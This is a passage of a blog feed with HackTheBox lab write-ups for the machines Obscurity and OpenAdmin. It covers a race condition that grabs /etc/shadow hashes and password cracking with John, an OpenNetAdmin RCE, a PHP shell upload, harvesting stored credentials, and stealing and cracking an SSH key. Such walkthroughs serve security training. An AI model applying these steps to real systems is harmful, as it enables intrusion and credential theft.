            &lt;span class=&quot;n&quot;&gt;salt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;realPass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'$'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;salt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Invalid user&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/tmp/SSH/'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;salt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'$6$'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;salt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'$'&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;realPass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;salt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;realPass&lt;/span&gt;

    &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;salt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;realPass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Authed!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'authenticated'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Incorrect pass&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/tmp/SSH/'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/tmp/SSH/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;traceback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print_exc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'authenticated'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'user'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;@Obscure$ &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'sudo'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'-u'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'user'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extend&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIPE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIPE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;communicate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Output: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ascii'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Error: '&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ascii'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ascii'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This script is doing some stupidly dangerous things.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;It’s opening and parsing /etc/shadow, if run as root (which I can do).&lt;/li&gt;
  &lt;li&gt;Spliting on the colon, it copies every “user” hash, etc. to a file in the tmp directory.&lt;/li&gt;
  &lt;li&gt;All I would have to do is snag a copy of the file before it’s removed.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I open a second SSH session and run:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; –r /tmp/SSH/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /dev/shm&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In my other session, I run the script with sudo, and enter in Robert’s creds:
&lt;img src=&quot;\assets\images\htb\obscurity\better-ssh.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It successfully grabs the file and copies it to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/shm&lt;/code&gt; for me.
&lt;img src=&quot;\assets\images\htb\obscurity\better-ssh-out.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I crack the hash with John.
&lt;img src=&quot;\assets\images\htb\obscurity\root-crack.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We get the password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mercedes&lt;/code&gt; and a quick &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su&lt;/code&gt; to root, we capture the root flag! Awesome box!
&lt;img src=&quot;\assets\images\htb\obscurity\root-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Thank you for reading.&lt;/p&gt;</content><author><name>J.D. Grow</name></author><category term="hackthebox" /><category term="hackthebox" /><category term="reversing" /><category term="python" /><category term="penetration testing" /><category term="write-ups" /><summary type="html">Obscurity was an absolutely awesome machine by clubby789 on HackTheBox. Rolling their own web server, encryption, and SSH application, it gave a couple of holes that I could squeeze through.</summary></entry><entry><title type="html">OpenAdmin Write-Up: HackTheBox</title><link href="https://gr0sabi.github.io/hackthebox/openadmin-write-up-hackthebox/" rel="alternate" type="text/html" title="OpenAdmin Write-Up: HackTheBox" /><published>2020-05-02T00:00:00-04:00</published><updated>2020-05-02T00:00:00-04:00</updated><id>https://gr0sabi.github.io/hackthebox/openadmin-write-up-hackthebox</id><content type="html" xml:base="https://gr0sabi.github.io/hackthebox/openadmin-write-up-hackthebox/">&lt;p&gt;&lt;img src=&quot;\assets\images\htb\openadmin\banner-openadmin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;OpenAdmin was a fun, easy machine with an interesting internal web application. With only two open ports, SSH (22) and HTTP (80) the attack surface is minimal. Web enumeration revealed a few web applications, one being an outdated OpenNetAdmin IP Address Management (IPAM) system (v18.1.1), which allowed RCE as the www-data user. Once we obtained a shell, system enumeration revealed stored credentials which allowed us to pivot via SSH to another user (Jimmy). The Jimmy user was part of a unique group that allowed us access to an internal web application that output the SSH private key (encrypted, but easily cracked) to another user (Joanna). Joanna had sudo privileges to run Nano against a file, which using the help of GTFOBins, gave us a root shell.&lt;/p&gt;

&lt;h2 id=&quot;nmap-port-scan&quot;&gt;Nmap Port Scan&lt;/h2&gt;
&lt;p&gt;Looking at the scan, we see a couple of ports open.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/openadmin-full 10.10.10.171
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;\assets\images\htb\openadmin\openadmin-nmap.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;
&lt;p&gt;Directory brute-forcing revealed several directories.&lt;/p&gt;

&lt;p&gt;Command Used: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rustbuster dir -u http://10.10.10.171 -w /opt/SecLists/Discovery/Web-Content/common.txt -t 25&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\htb\openadmin\rustbuster-openadmin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Clicking Login, takes us to an ONA interface.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.171/music/&lt;/code&gt; 
&lt;img src=&quot;\assets\images\htb\openadmin\musicweb-openadmin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;OpenNetAdmin IP Address Management (IPAM) system
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.171/ona/&lt;/code&gt;
&lt;img src=&quot;\assets\images\htb\openadmin\ona-openadmin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;opennetadmin-exploitation&quot;&gt;OpenNetAdmin Exploitation&lt;/h2&gt;

&lt;p&gt;Searchsploit revealed a couple of exploits for the version, one with Metasploit and one without. 
&lt;img src=&quot;\assets\images\htb\openadmin\search-openadmin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Copying the bash script directly from searchsploit left a few random carriage returns, etc., so the script needed a little cleanup. But after being cleaned up, it worked and we have a rudimentary shell as www-data.
&lt;img src=&quot;\assets\images\htb\openadmin\exploit-openadmin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I uploaded, upgraded and executed a proper php shell. 
&lt;img src=&quot;\assets\images\htb\openadmin\phpshell-openadmin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/32cc7df561b8076201312e4fc5294f14.js&quot;&gt; &lt;/script&gt;

&lt;h2 id=&quot;post-exploitation&quot;&gt;Post-Exploitation&lt;/h2&gt;

&lt;p&gt;Time to enumerate! Quick hits with some grepping came up with:
&lt;img src=&quot;\assets\images\htb\openadmin\database_settings-openadmin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Command used:  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;egrep -R 'password|pass'&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ona_contexts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
  &lt;span class=&quot;s1&quot;&gt;'DEFAULT'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 
  &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'databases'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 
    &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
      &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 
      &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;s1&quot;&gt;'db_type'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'mysqli'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s1&quot;&gt;'db_host'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s1&quot;&gt;'db_login'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ona_sys'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s1&quot;&gt;'db_passwd'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'n1nj4W4rri0R!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s1&quot;&gt;'db_database'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ona_default'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s1&quot;&gt;'db_debug'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'description'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Default data context'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'context_color'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#D3DBFF'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Awesome, we have a password! Further enumerating the database gives some hashes.
&lt;img src=&quot;\assets\images\htb\openadmin\OpenAdmin-HTB.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;getting-jimmy&quot;&gt;Getting Jimmy&lt;/h2&gt;

&lt;p&gt;The hashes were essentially useless. But we have another way! A quick look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; reveals two regular users: jimmy &amp;amp; joanna. A quick try with jimmy and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n1nj4W4rri0R!&lt;/code&gt; password gets us a SSH session and some interesting finds with LinPEAS!
&lt;img src=&quot;\assets\images\htb\openadmin\linpeas1-openadmin.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;\assets\images\htb\openadmin\linpeas2-openadmin.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;\assets\images\htb\openadmin\linpeas3-openadmin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So it appears our friend Jimmy (and Joanna) is in an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;internal&lt;/code&gt; group which has write access to “/var/www/internal”. A quick telnet/curl to the unusual port reveals it is an Apache service hosting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;internal.openadmin.htb&lt;/code&gt;. Putting two and two together, it is probably serving the internal directory. Let’s check out that directory.&lt;/p&gt;

&lt;p&gt;Well, it appears we can get Joanna’s SSH private key:
main.php&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php session_start(); if (!isset ($_SESSION['username'])) { header(&quot;Location: /index.php&quot;); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo &quot;&amp;lt;pre&amp;gt;$output&amp;lt;/pre&amp;gt;&quot;;
?&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;h3&amp;gt;Don't forget your &quot;ninja&quot; password&amp;lt;/h3&amp;gt;
Click here to logout &amp;lt;a href=&quot;logout.php&quot; tite = &quot;Logout&quot;&amp;gt;Session
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Easy enough.
&lt;img src=&quot;\assets\images\htb\openadmin\joannakey-openadmin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It’s encrypted, so we use:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/john/ssh2john.py joanna.key &amp;gt; joanna.hash&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john joanna.hash --wordlist=/usr/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;John made quick work of it, even in a VM. We get the password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bloodninjas&lt;/code&gt;.
&lt;img src=&quot;\assets\images\htb\openadmin\john-openadmin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;moving-to-joanna&quot;&gt;Moving to Joanna&lt;/h2&gt;

&lt;p&gt;We get in and capture user.txt.
